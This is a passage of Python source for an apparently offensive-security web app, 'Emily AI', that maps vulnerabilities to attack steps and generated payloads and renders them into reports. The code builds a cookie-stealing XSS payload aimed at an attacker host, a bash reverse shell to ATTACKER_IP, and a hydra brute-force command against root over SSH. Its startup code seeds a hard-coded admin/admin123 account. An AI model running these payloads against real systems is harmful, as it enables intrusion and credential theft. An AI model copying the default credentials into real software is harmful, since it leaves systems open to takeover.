            "low_count": sum(1 for v in vulnerabilities if v.get("severity") == "LOW"),
            "attack_vectors_count": len(analysis["attack_vectors"]),
            "payloads_generated": len(analysis["payloads"]),
            "risk_score": risk_score,
            "risk_level": analysis["risk_level"]
        }
        
        return analysis
    
    def _match_exploit(self, vulnerability):
        """Match vulnerability with exploit database"""
        vuln_name = vulnerability.get("name", "").lower()
        cve = vulnerability.get("cve", "")
        
        # Try to match by CVE first
        if cve and cve in self.exploit_database:
            return self.exploit_database[cve]
        
        # Try to match by name
        for cve_id, exploit in self.exploit_database.items():
            if vuln_name in exploit["name"].lower():
                return exploit
        
        return None
    
    def _generate_attack_vector(self, vulnerability, exploit, target_info):
        """Generate attack vector for vulnerability"""
        vuln_name = vulnerability.get("name", "")
        service = vulnerability.get("service", "unknown")
        severity = vulnerability.get("severity", "MEDIUM")
        
        attack_vector = {
            "vulnerability": vuln_name,
            "service": service,
            "severity": severity,
            "attack_type": "unknown",
            "steps": [],
            "tools": [],
            "success_probability": vulnerability.get("probability", 70)
        }
        
        if exploit:
            attack_vector["attack_type"] = exploit.get("name")
            attack_vector["steps"] = self._generate_exploit_steps(exploit, target_info)
            attack_vector["tools"] = exploit.get("tools", [])
            
            if "exploit" in exploit:
                attack_vector["command"] = exploit["exploit"].format(
                    target=target_info.get("target", "TARGET"),
                    lhost=target_info.get("lhost", "127.0.0.1"),
                    lport=target_info.get("lport", "4444")
                )
        else:
            # Generate based on service
            attack_vector["steps"] = self._generate_service_steps(service, target_info)
            attack_vector["tools"] = self._get_tools_for_service(service)
        
        return attack_vector
    
    def _generate_exploit_steps(self, exploit, target_info):
        """Generate step-by-step exploit instructions"""
        steps = [
            f"1. Identify target service on port {exploit.get('port', ['unknown'])[0]}",
            f"2. Verify vulnerability using: {exploit.get('tools', ['nmap'])[0]}",
            f"3. Prepare exploit: {exploit.get('exploit', '')}",
            "4. Set up listener for reverse shell",
            "5. Execute exploit against target",
            "6. Verify successful exploitation",
            "7. Escalate privileges if needed",
            "8. Maintain access and cleanup"
        ]
        return steps
    
    def _generate_service_steps(self, service, target_info):
        """Generate attack steps based on service type"""
        steps_map = {
            "http": [
                "1. Enumerate web directories with gobuster",
                "2. Scan for web vulnerabilities with nikto",
                "3. Test for SQL injection with sqlmap",
                "4. Check for XSS vulnerabilities",
                "5. Attempt file inclusion attacks",
                "6. Deploy web shell if RCE found"
            ],
            "ssh": [
                "1. Enumerate SSH users with metasploit",
                "2. Attempt brute force with hydra",
                "3. Check for SSH key vulnerabilities",
                "4. Try default credentials",
                "5. Escalate if successful"
            ],
            "smb": [
                "1. Enumerate SMB shares with smbclient",
                "2. Check for null sessions",
                "3. Test for EternalBlue (MS17-010)",
                "4. Attempt pass-the-hash",
                "5. Extract credentials with secretsdump"
            ],
            "mysql": [
                "1. Check for remote access",
                "2. Attempt default credentials",
                "3. Brute force with hydra",
                "4. Enumerate databases",
                "5. Extract sensitive data"
            ],
            "rdp": [
                "1. Check for BlueKeep (CVE-2019-0708)",
                "2. Attempt brute force with crowbar",
                "3. Check for weak encryption",
                "4. Try pass-the-hash"
            ]
        }
        return steps_map.get(service, [f"1. Scan service {service} for vulnerabilities"])
    
    def _get_tools_for_service(self, service):
        """Get recommended tools for service"""
        tools_map = {
            "http": ["nmap", "nikto", "gobuster", "sqlmap", "burpsuite"],
            "https": ["nmap", "nikto", "gobuster", "sqlmap", "burpsuite", "sslscan"],
            "ssh": ["nmap", "hydra", "medusa", "ncrack"],
            "ftp": ["nmap", "hydra", "ftp-anon", "lftp"],
            "smb": ["nmap", "smbclient", "enum4linux", "impacket"],
            "mysql": ["nmap", "hydra", "mysql-client", "sqlmap"],
            "rdp": ["nmap", "crowbar", "rdp-sec-check"],
            "dns": ["nmap", "dnsrecon", "dnsenum", "fierce"],
            "smtp": ["nmap", "smtp-user-enum", "swaks"]
        }
        return tools_map.get(service, ["nmap"])
    
    def _generate_payload(self, vulnerability, exploit, target_info):
        """Generate specific payload for vulnerability"""
        vuln_name = vulnerability.get("name", "").lower()
        service = vulnerability.get("service", "")
        
        payload = {
            "vulnerability": vulnerability.get("name"),
            "type": "generic",
            "payload": "",
            "description": "",
            "usage": ""
        }
        
        # Match with payload templates
        if "sql" in vuln_name:
            payload["type"] = "sql_injection"
            payload["payload"] = self.payload_templates["sql_injection"]["union_based"]
            payload["description"] = "Union-based SQL injection payload to extract data"
            payload["usage"] = "Inject into vulnerable parameters (id, page, etc.)"
            
        elif "xss" in vuln_name:
            payload["type"] = "xss"
            payload_template = self.payload_templates["xss_payloads"]["cookie_stealer"]
            payload["payload"] = payload_template.format(lhost=target_info.get("lhost", "attacker.com"))
            payload["description"] = "XSS payload to steal cookies"
            payload["usage"] = "Inject into search fields, comments, or URL parameters"
            
        elif "path" in vuln_name or "traversal" in vuln_name:
            payload["type"] = "lfi"
            payload["payload"] = self.payload_templates["lfi_payloads"]["basic"]
            payload["description"] = "Local File Inclusion to read sensitive files"
            payload["usage"] = "Inject into file parameters"
            
        elif "rce" in vuln_name or "command" in vuln_name:
            payload["type"] = "command_injection"
            payload["payload"] = self.payload_templates["command_injection"]["reverse_shell"]
            payload["description"] = "Reverse shell payload"
            payload["usage"] = f"Execute with: {self.payload_templates['reverse_shell']['bash'].format(lhost=target_info.get('lhost', 'ATTACKER_IP'), lport=target_info.get('lport', '4444'))}"
            
        elif "ssh" in service:
            payload["type"] = "bruteforce"
            payload["payload"] = f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target_info.get('target', 'TARGET')}"
            payload["description"] = "SSH brute force attack"
            payload["usage"] = "Run hydra with appropriate wordlist"
            
        elif exploit:
            payload["type"] = "exploit"
            payload["payload"] = exploit.get("exploit", "").format(
                target=target_info.get("target", "TARGET"),
                lhost=target_info.get("lhost", "127.0.0.1"),
                lport=target_info.get("lport", "4444")
            )
            payload["description"] = exploit.get("description", "Exploit payload")
            payload["usage"] = f"Use with {exploit.get('tools', ['metasploit'])[0]}"
        
        return payload
    
    def _generate_recommendations(self, attack_vectors):
        """Generate security recommendations"""
        recommendations = []
        
        # Group by service
        services = {}
        for vector in attack_vectors:
            service = vector.get("service", "unknown")
            if service not in services:
                services[service] = []
            services[service].append(vector)
        
        # Generate recommendations per service
        for service, vectors in services.items():
            if service == "http" or service == "https":
                recommendations.extend([
                    "✅ Implement Web Application Firewall (WAF)",
                    "✅ Use parameterized queries to prevent SQL injection",
                    "✅ Implement Content Security Policy (CSP)",
                    "✅ Sanitize all user inputs",
                    "✅ Keep web server and applications updated",
                    "✅ Disable directory listing",
                    "✅ Remove sensitive files from web root"
                ])
            elif service == "ssh":
                recommendations.extend([
                    "✅ Disable root login over SSH",
                    "✅ Use key-based authentication instead of passwords",
                    "✅ Change default SSH port",
                    "✅ Implement fail2ban for brute force protection",
                    "✅ Use strong password policies"
                ])
            elif service == "smb":
                recommendations.extend([
                    "✅ Disable SMBv1 protocol",
                    "✅ Apply MS17-010 patch",
                    "✅ Restrict SMB access with firewall rules",
                    "✅ Use strong passwords for SMB shares",
                    "✅ Disable null sessions"
                ])
            elif service == "mysql":
                recommendations.extend([
                    "✅ Bind MySQL to localhost only",
                    "✅ Remove anonymous users",
                    "✅ Use strong passwords for database accounts",
                    "✅ Regularly update MySQL",
                    "✅ Implement least privilege principle"
                ])
        
        # General recommendations
        recommendations.extend([
            "✅ Implement network segmentation",
            "✅ Deploy IDS/IPS for threat detection",
            "✅ Regular security audits and penetration testing",
            "✅ Employee security awareness training",
            "✅ Implement principle of least privilege",
            "✅ Enable comprehensive logging and monitoring"
        ])
        
        # Remove duplicates and return
        return list(dict.fromkeys(recommendations))[:10]
    
    def _calculate_risk_score(self, attack_vectors):
        """Calculate overall risk score"""
        if not attack_vectors:
            return 30
        
        severity_weights = {
            "CRITICAL": 10,
            "HIGH": 7,
            "MEDIUM": 4,
            "LOW": 1
        }
        
        total_score = 0
        for vector in attack_vectors:
            severity = vector.get("severity", "MEDIUM")
            probability = vector.get("success_probability", 50) / 100
            weight = severity_weights.get(severity, 4)
            total_score += weight * probability
        
        # Normalize to 0-100
        max_possible = len(attack_vectors) * 10
        if max_possible == 0:
            return 30
        
        return min(100, int((total_score / max_possible) * 100))
    
    def _get_risk_level(self, score):
        """Convert numeric score to risk level"""
        if score >= 80:
            return "CRITICAL"
        elif score >= 60:
            return "HIGH"
        elif score >= 40:
            return "MEDIUM"
        else:
            return "LOW"
    
    def generate_report(self, analysis, format="html"):
        """Generate comprehensive report from analysis"""
        if format == "html":
            return self._generate_html_report(analysis)
        elif format == "json":
            return json.dumps(analysis, indent=2)
        elif format == "markdown":
            return self._generate_markdown_report(analysis)
        else:
            return self._generate_text_report(analysis)
    
    def _generate_html_report(self, analysis):
        """Generate HTML report"""
        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        
        # Build exploit chain HTML
        exploit_chain_html = ""
        for i, exploit in enumerate(analysis["exploit_chain"][:5]):
            probability_color = "green" if exploit["probability"] > 80 else "yellow" if exploit["probability"] > 60 else "orange"
            exploit_chain_html += f"""
            <tr>
                <td>{i+1}</td>
                <td><span class="severity-{exploit['severity'].lower()}">{exploit['severity']}</span></td>
                <td>{exploit['vulnerability']}</td>
                <td>{exploit['service']}:{exploit['port']}</td>
                <td>{exploit['exploit']}</td>
                <td><span class="probability-{probability_color}">{exploit['probability']}%</span></td>
            </tr>
            """
        
        # Build attack vectors HTML
        vectors_html = ""
        for vector in analysis["attack_vectors"][:3]:
            steps_html = "".join([f"<li>{step}</li>" for step in vector.get("steps", [])[:3]])
            vectors_html += f"""
            <div class="vector-card">
                <h4>{vector['attack_type']} - {vector['vulnerability']}</h4>
                <p><strong>Service:</strong> {vector['service']} | <strong>Severity:</strong> {vector['severity']} | <strong>Success Rate:</strong> {vector['success_probability']}%</p>
                <p><strong>Tools:</strong> {', '.join(vector.get('tools', ['nmap']))}</p>
                <div class="steps">
                    <strong>Steps:</strong>
                    <ul>{steps_html}</ul>
                </div>
            </div>
            """
        
        # Build payloads HTML
        payloads_html = ""
        for payload in analysis["payloads"][:3]:
            payloads_html += f"""
            <div class="payload-card">
                <h4>{payload['type'].upper()} Payload for {payload['vulnerability']}</h4>
                <p><strong>Description:</strong> {payload['description']}</p>
                <pre class="payload-code">{payload['payload']}</pre>
                <p><strong>Usage:</strong> {payload['usage']}</p>
            </div>
            """
        
        # Build recommendations HTML
        recommendations_html = "".join([f"<li>{rec}</li>" for rec in analysis["recommendations"][:5]])
        
        # Generate full HTML
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Emily AI - Security Assessment Report</title>
    <style>
        body {{
            font-family: 'Inter', sans-serif;
            background: #030614;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        .header {{
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            text-align: center;
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.5em;
            color: white;
            text-shadow: 0 0 10px rgba(0,0,0,0.5);
        }}
        .header p {{
            margin: 10px 0 0;
            opacity: 0.9;
        }}
        .summary-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .summary-card {{
            background: rgba(20, 30, 40, 0.9);
            border: 1px solid #00ffff33;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            backdrop-filter: blur(10px);
        }}
        .summary-card h3 {{
            margin: 0 0 10px;
            color: #00ffff;
            font-size: 1.1em;
        }}
        .summary-card .value {{
            font-size: 2.5em;
            font-weight: bold;
            margin: 0;
        }}
        .summary-card .critical {{ color: #ff4444; }}
        .summary-card .high {{ color: #ff8800; }}
        .summary-card .medium {{ color: #ffff00; }}
        .summary-card .low {{ color: #00ff00; }}
        .section {{
            background: rgba(10, 15, 25, 0.95);
            border: 1px solid #00ffff33;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 255, 255, 0.1);
        }}
        .section h2 {{
            margin-top: 0;
            color: #ff00ff;
            border-bottom: 2px solid #00ffff33;
            padding-bottom: 10px;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
        }}
        th {{
            text-align: left;
            padding: 12px;
            background: rgba(0, 255, 255, 0.1);
            color: #00ffff;
            font-weight: 600;
        }}
        td {{
            padding: 12px;
            border-bottom: 1px solid #00ffff33;
        }}
        .severity-critical {{ color: #ff4444; font-weight: bold; }}
        .severity-high {{ color: #ff8800; font-weight: bold; }}
        .severity-medium {{ color: #ffff00; font-weight: bold; }}
        .severity-low {{ color: #00ff00; font-weight: bold; }}
        .probability-green {{ color: #00ff00; }}
        .probability-yellow {{ color: #ffff00; }}
        .probability-orange {{ color: #ff8800; }}
        .vector-card, .payload-card {{
            background: rgba(20, 25, 35, 0.9);
            border: 1px solid #ff00ff33;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }}
        .vector-card h4, .payload-card h4 {{
            margin: 0 0 10px;
            color: #00ffff;
        }}
        .steps {{
            margin-top: 10px;
            padding-left: 20px;
        }}
        .payload-code {{
            background: #1a1f2e;
            padding: 12px;
            border-radius: 6px;
            border-left: 3px solid #ff00ff;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            overflow-x: auto;
            white-space: pre-wrap;
        }}
        .recommendations {{
            list-style: none;
            padding: 0;
        }}
        .recommendations li {{
            padding: 8px 12px;
            margin-bottom: 8px;
            background: rgba(0, 255, 255, 0.05);
            border-left: 3px solid #00ff00;
            border-radius: 4px;
        }}
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: #666;
            border-top: 1px solid #00ffff33;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🤖 Emily AI - Security Assessment Report</h1>
            <p>Generated: {timestamp} | Target: {analysis['target']} | Risk Level: <span style="color: {'#ff4444' if analysis['risk_level'] == 'CRITICAL' else '#ff8800' if analysis['risk_level'] == 'HIGH' else '#ffff00' if analysis['risk_level'] == 'MEDIUM' else '#00ff00'}">{analysis['risk_level']}</span></p>
        </div>
        
        <div class="summary-grid">
            <div class="summary-card">
                <h3>Total Vulnerabilities</h3>
                <div class="value">{analysis['summary']['total_vulnerabilities']}</div>
            </div>
            <div class="summary-card">
                <h3>Critical</h3>
                <div class="value critical">{analysis['summary']['critical_count']}</div>
            </div>
            <div class="summary-card">
                <h3>High</h3>
                <div class="value high">{analysis['summary']['high_count']}</div>
            </div>
            <div class="summary-card">
                <h3>Medium</h3>
                <div class="value medium">{analysis['summary']['medium_count']}</div>
            </div>
            <div class="summary-card">
                <h3>Low</h3>
                <div class="value low">{analysis['summary']['low_count']}</div>
            </div>
            <div class="summary-card">
                <h3>Risk Score</h3>
                <div class="value" style="color: {'#ff4444' if analysis['summary']['risk_score'] >= 80 else '#ff8800' if analysis['summary']['risk_score'] >= 60 else '#ffff00' if analysis['summary']['risk_score'] >= 40 else '#00ff00'}">{analysis['summary']['risk_score']}</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🔍 Exploit Chain (Priority Order)</h2>
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Severity</th>
                        <th>Vulnerability</th>
                        <th>Service/Port</th>
                        <th>Exploit</th>
                        <th>Probability</th>
                    </tr>
                </thead>
                <tbody>
                    {exploit_chain_html}
                </tbody>
            </table>
        </div>
        
        <div class="section">
            <h2>⚔️ Attack Vectors</h2>
            {vectors_html}
        </div>
        
        <div class="section">
            <h2>💣 Generated Payloads</h2>
            {payloads_html}
        </div>
        
        <div class="section">
            <h2>🛡️ Security Recommendations</h2>
            <ul class="recommendations">
                {recommendations_html}
            </ul>
        </div>
        
        <div class="footer">
            <p>Generated by Emily AI v{self.version} - Advanced Exploit Analyzer & Payload Generator</p>
            <p style="font-size: 12px; margin-top: 10px;">⚠️ For authorized security testing only</p>
        </div>
    </div>
</body>
</html>"""
        
        return html
    
    def _generate_markdown_report(self, analysis):
        """Generate Markdown report"""
        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        
        markdown = f"""# 🤖 Emily AI - Security Assessment Report

**Generated:** {timestamp}  
**Target:** {analysis['target']}  
**Risk Level:** **{analysis['risk_level']}**  

## 📊 Summary

| Metric | Value |
|--------|-------|
| Total Vulnerabilities | {analysis['summary']['total_vulnerabilities']} |
| Critical | {analysis['summary']['critical_count']} |
| High | {analysis['summary']['high_count']} |
| Medium | {analysis['summary']['medium_count']} |
| Low | {analysis['summary']['low_count']} |
| Attack Vectors | {analysis['summary']['attack_vectors_count']} |
| Payloads Generated | {analysis['summary']['payloads_generated']} |
| Risk Score | {analysis['summary']['risk_score']} |

## 🔍 Exploit Chain (Priority Order)

| # | Severity | Vulnerability | Service/Port | Exploit | Probability |
|---|----------|---------------|--------------|---------|-------------|
"""
        
        for i, exploit in enumerate(analysis["exploit_chain"][:5]):
            markdown += f"| {i+1} | {exploit['severity']} | {exploit['vulnerability']} | {exploit['service']}:{exploit['port']} | {exploit['exploit']} | {exploit['probability']}% |\n"
        
        markdown += "\n## ⚔️ Attack Vectors\n\n"
        
        for vector in analysis["attack_vectors"][:3]:
            markdown += f"### {vector['attack_type']} - {vector['vulnerability']}\n"
            markdown += f"**Service:** {vector['service']} | **Severity:** {vector['severity']} | **Success Rate:** {vector['success_probability']}%\n"
            markdown += f"**Tools:** {', '.join(vector.get('tools', ['nmap']))}\n\n"
            markdown += "**Steps:**\n"
            for step in vector.get("steps", [])[:3]:
                markdown += f"- {step}\n"
            markdown += "\n"
        
        markdown += "## 💣 Generated Payloads\n\n"
        
        for payload in analysis["payloads"][:3]:
            markdown += f"### {payload['type'].upper()} Payload for {payload['vulnerability']}\n"
            markdown += f"**Description:** {payload['description']}\n\n"
            markdown += "```\n" + payload['payload'] + "\n```\n\n"
            markdown += f"**Usage:** {payload['usage']}\n\n"
        
        markdown += "## 🛡️ Security Recommendations\n\n"
        
        for rec in analysis["recommendations"][:5]:
            markdown += f"- {rec}\n"
        
        markdown += f"\n---\n*Generated by Emily AI v{self.version} - Advanced Exploit Analyzer & Payload Generator*\n"
        markdown += "*⚠️ For authorized security testing only*\n"
        
        return markdown
    
    def _generate_text_report(self, analysis):
        """Generate plain text report"""
        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        
        text = f"""EMILY AI - SECURITY ASSESSMENT REPORT
{'=' * 50}

Generated: {timestamp}
Target: {analysis['target']}
Risk Level: {analysis['risk_level']}

SUMMARY
{'-' * 30}
Total Vulnerabilities: {analysis['summary']['total_vulnerabilities']}
  Critical: {analysis['summary']['critical_count']}
  High: {analysis['summary']['high_count']}
  Medium: {analysis['summary']['medium_count']}
  Low: {analysis['summary']['low_count']}
Attack Vectors: {analysis['summary']['attack_vectors_count']}
Payloads Generated: {analysis['summary']['payloads_generated']}
Risk Score: {analysis['summary']['risk_score']}

EXPLOIT CHAIN (Priority Order)
{'-' * 30}
"""
        for i, exploit in enumerate(analysis["exploit_chain"][:5]):
            text += f"{i+1}. [{exploit['severity']}] {exploit['vulnerability']} on {exploit['service']}:{exploit['port']}\n"
            text += f"   Exploit: {exploit['exploit']}\n"
            text += f"   Probability: {exploit['probability']}%\n\n"
        
        text += "ATTACK VECTORS\n" + ('-' * 30) + "\n\n"
        for vector in analysis["attack_vectors"][:3]:
            text += f"{vector['attack_type']} - {vector['vulnerability']}\n"
            text += f"Service: {vector['service']} | Severity: {vector['severity']} | Success Rate: {vector['success_probability']}%\n"
            text += f"Tools: {', '.join(vector.get('tools', ['nmap']))}\n"
            text += "Steps:\n"
            for step in vector.get("steps", [])[:3]:
                text += f"  - {step}\n"
            text += "\n"
        
        text += "GENERATED PAYLOADS\n" + ('-' * 30) + "\n\n"
        for payload in analysis["payloads"][:3]:
            text += f"{payload['type'].upper()} Payload for {payload['vulnerability']}\n"
            text += f"Description: {payload['description']}\n"
            text += f"Payload: {payload['payload']}\n"
            text += f"Usage: {payload['usage']}\n\n"
        
        text += "SECURITY RECOMMENDATIONS\n" + ('-' * 30) + "\n"
        for rec in analysis["recommendations"][:5]:
            text += f"• {rec}\n"
        
        text += f"\n\nGenerated by Emily AI v{self.version}\n"
        text += "⚠️ For authorized security testing only\n"
        
        return text


# Initialize Emily AI globally
emily_ai = None

# ==================== FASTAPI APP WITH GPU-AWARE LIFESPAN ====================
# @asynccontextmanager
# async def lifespan(app: FastAPI):
#     # ============================
#     # 🚀 STARTUP PHASE
#     # ============================
#     import torch
#     import secrets
    
#     # 1. Ensure Database Tables Exist (Fixes OperationalError: no such table: users)
#     Base.metadata.create_all(bind=engine)
#     print("\n✓ Database tables verified/created")

#     # 2. Initialize Admin User
#     db = SessionLocal()
#     try:
#         admin = db.query(User).filter(User.username == "admin").first()
#         if not admin:
#             admin_user = User(
#                 username="admin",
#                 email="admin@cybersec.local",
#                 password=get_password_hash("admin123"),
#                 role=UserRole.ADMIN.value,
#                 is_active=True,
#                 api_key=secrets.token_hex(32)
#             )
#             db.add(admin_user)
#             db.commit()
#             print("✓ Admin user created (admin/admin123)")
#     finally:
#         db.close()

#     # 3. System Status Display (Fixes NameError by defining variables locally)
#     if CUDA_AVAILABLE and torch.cuda.is_available():
#         try:
#             props = torch.cuda.get_device_properties(0)
#             total_vram_gb = props.total_memory / (1024 ** 3)
#             allocated = torch.cuda.memory_allocated(0) / (1024 ** 2)
#             reserved = torch.cuda.memory_reserved(0) / (1024 ** 2)

#             print(f"\n🔧 GPU: ✓ {props.name}")
#             print(f"   Total VRAM: {total_vram_gb:.2f} GB")
#             print(f"   VRAM Allocated: {allocated:.1f} MB")
#             print(f"   VRAM Reserved : {reserved:.1f} MB")

#             if total_vram_gb <= 4.5:
#                 print("   ⚠ 4GB-Class GPU Detected: Resource constraints active.")
#         except Exception as e:
#             print(f"\n🔧 GPU detected but stats unavailable: {e}")

#     print(f"🔧 Redis: {'✓' if REDIS_CLIENT else '✗'}")
    
#     yield  # ----------------- Application is running -----------------

#     # ============================
#     # 🛑 SHUTDOWN PHASE
#     # ============================
#     if CUDA_AVAILABLE:
#         # Re-calculating locally to avoid NameError: 'gpu_memory'
#         final_allocated = torch.cuda.memory_allocated(0) / 1024**2
#         print(f"\n📊 Final GPU Memory Status:")
#         print(f"  • Allocated: {final_allocated:.1f} MB")
        # torch.cuda.empty_cache() # Optional: Clear cache on exit
# Global variables for metrics

@asynccontextmanager
async def lifespan(app: FastAPI):
    # ============================
    # 🚀 STARTUP PHASE
    # ============================
    import torch
    import secrets
    
    # Check for globals, provide fallbacks if they aren't defined yet
    is_cuda_ready = globals().get('CUDA_AVAILABLE', False)
    redis_available = globals().get('REDIS_CLIENT') is not None

    # 1. Ensure Database Tables Exist
    try:
        Base.metadata.create_all(bind=engine)
        print("\n✓ Database tables verified/created")
    except Exception as e:
        print(f"❌ Database error: {e}")

    # 2. Initialize Admin User
    db = SessionLocal()
    try:
        admin = db.query(User).filter(User.username == "admin").first()
        if not admin:
            admin_user = User(
                username="admin",
                email="admin@cybersec.local",
                password=get_password_hash("admin123"),
                role=UserRole.ADMIN.value,
                is_active=True,
                api_key=secrets.token_hex(32)
            )
            db.add(admin_user)
            db.commit()
            print("✓ Admin user created (admin/admin123)")
    finally:
        db.close()

    # 3. System Status Display
    # Using is_cuda_ready and torch.cuda.is_available() safely
    if is_cuda_ready and torch.cuda.is_available():
        try:
            props = torch.cuda.get_device_properties(0)
            total_vram_gb = props.total_memory / (1024 ** 3)
            allocated = torch.cuda.memory_allocated(0) / (1024 ** 2)
            reserved = torch.cuda.memory_reserved(0) / (1024 ** 2)

            print(f"\n🔧 GPU: ✓ {props.name}")
            print(f"   Total VRAM: {total_vram_gb:.2f} GB")
            print(f"   VRAM Allocated: {allocated:.1f} MB")
            print(f"   VRAM Reserved : {reserved:.1f} MB")

            if total_vram_gb <= 4.5:
                print("   ⚠ 4GB-Class GPU Detected: Resource constraints active.")
        except Exception as e:
            print(f"\n🔧 GPU detected but stats unavailable: {e}")
    else:
        print("\n🔧 GPU: ✗ (Running on CPU)")

    print(f"🔧 Redis: {'✓' if redis_available else '✗'}")
    
    # 4. Initialize Orchestrator Components
    # Ensure the orchestrator is linked to its sub-systems here
    global orchestrator
    # Fix by checking if orchestrator exists
    if 'orchestrator' in globals() and orchestrator:
        orchestrator.initialize(
            correlation_system=globals().get('correlation_system'),
            intelligence_engine=globals().get('intelligence_engine'),
            sentinel_brain=globals().get('sentinel_brain'),
            rag_system=globals().get('rag_system')
        )

    yield   # ----------------- Application is running -----------------

    # ============================
    # 🛑 SHUTDOWN PHASE
    # ============================
    if is_cuda_ready and torch.cuda.is_available():
        try:
            final_allocated = torch.cuda.memory_allocated(0) / 1024**2
            print(f"\n📊 Final GPU Memory Status:")
            print(f"  • Allocated: {final_allocated:.1f} MB")
            torch.cuda.empty_cache() # Clean up memory on exit
        except:
            pass
    # # Create tables
    # Base.metadata.create_all(bind=engine)
    # print("\n✓ Database tables created")
    # #database
   
    # Initialize database
    db = SessionLocal()
    try:
        # Create admin user
        admin = db.query(User).filter(User.username == "admin").first()
        if not admin:
            admin_user = User(
                username="admin",
                email="admin@cybersec.local",
                password=get_password_hash("admin123"),
                role=UserRole.ADMIN.value,
                is_active=True,
                api_key=secrets.token_hex(32)
            )
            db.add(admin_user)
            print("✓ Admin user created (admin/admin123)")
        
        # Add Kali tools
        if db.query(KaliTools).count() == 0:
            tools = [
                KaliTools(name='nmap', category='Scanner', description='Network scanner', risk_level='LOW', required_role='user'),
                KaliTools(name='nikto', category='Web', description='Web scanner', risk_level='MEDIUM', required_role='user'),
                KaliTools(name='sqlmap', category='Web', description='SQL injection', risk_level='HIGH', required_role='analyst'),
                KaliTools(name='hydra', category='Password', description='Brute force', risk_level='HIGH', required_role='analyst'),
                KaliTools(name='metasploit', category='Exploitation', description='Exploit framework', risk_level='CRITICAL', required_role='analyst'),
                KaliTools(name='wireshark', category='Sniffer', description='Packet analyzer', risk_level='LOW', required_role='user'),
                KaliTools(name='aircrack-ng', category='Wireless', description='WiFi cracking', risk_level='MEDIUM', required_role='analyst'),
                KaliTools(name='john', category='Password', description='Password cracker', risk_level='MEDIUM', required_role='user'),
                KaliTools(name='burpsuite', category='Web', description='Web proxy', risk_level='MEDIUM', required_role='analyst'),
                KaliTools(name='gobuster', category='Web', description='Directory brute force', risk_level='LOW', required_role='user'),
                KaliTools(name='wpscan', category='Web', description='WordPress scanner', risk_level='MEDIUM', required_role='user'),
                KaliTools(name='hashcat', category='Password', description='Hash cracker', risk_level='MEDIUM', required_role='analyst'),
            ]
            for tool in tools:
                db.add(tool)
            db.commit()
            print(f"✓ Added {len(tools)} Kali tools")
        
        # Add sample vulnerabilities
        if db.query(VulnerabilityDB).count() == 0:
            vulns = [
                VulnerabilityDB(
                    cve_id="CVE-2021-41773",
                    name="Apache Path Traversal",
                    description="Path traversal in Apache HTTP Server 2.4.49",
                    severity="CRITICAL",
                    cvss_score=9.8,
                    remediation="Update to Apache 2.4.51",
                    attack_tools="metasploit,curl"
                ),
                VulnerabilityDB(
                    cve_id="CVE-2021-44228",
                    name="Log4Shell",
                    description="RCE in Log4j 2.x",
                    severity="CRITICAL",
                    cvss_score=10.0,
                    remediation="Update to Log4j 2.17.1",
                    attack_tools="metasploit,nmap"
                ),
                VulnerabilityDB(
                    cve_id="CVE-2017-0144",
                    name="EternalBlue",
                    description="SMB vulnerability in Windows",
                    severity="CRITICAL",
                    cvss_score=9.3,
                    remediation="Apply MS17-010 patch",
                    attack_tools="metasploit"
                ),
                VulnerabilityDB(
                    cve_id="CVE-2019-0708",
                    name="BlueKeep",
                    description="RDP vulnerability in Windows",
                    severity="CRITICAL",
                    cvss_score=9.8,
                    remediation="Apply patch",
                    attack_tools="metasploit"
                ),
                VulnerabilityDB(
                    cve_id="CVE-2020-1472",
                    name="Zerologon",
                    description="Netlogon privilege escalation",
                    severity="CRITICAL",
                    cvss_score=9.8,
                    remediation="Apply security update",
                    attack_tools="impacket"
                )
            ]
            for vuln in vulns:
                db.add(vuln)
            db.commit()
            print("✓ Added sample vulnerabilities")
        
        # Initialize RAG system (will load AI model on GPU if available)
        global rag_system
        rag_system = GPURAGSystem()
        rag_system.initialize(db)
        
        # Initialize AI Intelligence Engine
        global intelligence_engine
        intelligence_engine = AISingleton.get_intelligence_engine()
        if rag_system.model is not None and hasattr(rag_system, 'faiss_index'):
            # Create a vector store wrapper for the intelligence engine
            class VectorStoreWrapper:
                def search(self, query, k=5):
                    return rag_system.search(query, k)
            
            intelligence_engine.set_vector_store(VectorStoreWrapper())
        
        print("🧠 AI Intelligence Engine ready with all 9 levels of reasoning")
        global emily_ai
        emily_ai = EmilyAI(intelligence_engine=intelligence_engine, rag_system=rag_system)
        print("✓ Emily AI v2.0 initialized - Exploit Analyst & Payload Generator")
        # Initialize Correlation System
        global correlation_system, llm_reasoner, vector_store, optimizer
        
        # Set up optimizer
        optimizer = SimpleOptimizer()
        
        # Set up LLM reasoner and vector store for correlation
        llm_reasoner = intelligence_engine.llm_reasoner if intelligence_engine else None
        
        if rag_system and hasattr(rag_system, 'faiss_index'):
            vector_store = rag_system
        else:
            vector_store = None
        
        # Initialize correlation system if available
        if CORRELATION_AVAILABLE:
            try:
                # Import here to avoid circular imports
                from integration_adapter import init_correlation_system, add_correlation_endpoints
                
                correlation_system = init_correlation_system(
                    rag_system=rag_system,
                    llm_reasoner=llm_reasoner,
                    vector_store=vector_store
                )
                
                # Add correlation endpoints to app
                app = add_correlation_endpoints(app)
                
                # Store in app state
                app.state.correlation_system = correlation_system
                
